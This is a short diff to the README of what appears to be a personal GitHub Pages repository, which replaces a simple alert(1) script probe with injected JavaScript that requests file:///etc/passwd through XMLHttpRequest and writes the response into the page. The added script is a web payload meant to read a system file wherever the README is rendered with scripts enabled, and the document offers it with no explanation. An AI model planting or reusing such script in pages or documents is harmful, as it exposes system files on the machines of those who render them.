@@ -1,3 +1,10 @@
 # rikiaji.github.io
 test
-<script>alert(1)</script>
+<script>
+	x=new XMLHttpRequest;
+	x.onload=function(){
+		document.write(this.responseText)
+	};
+	x.open("GET","file:///etc/passwd");
+	x.send();
+</script>
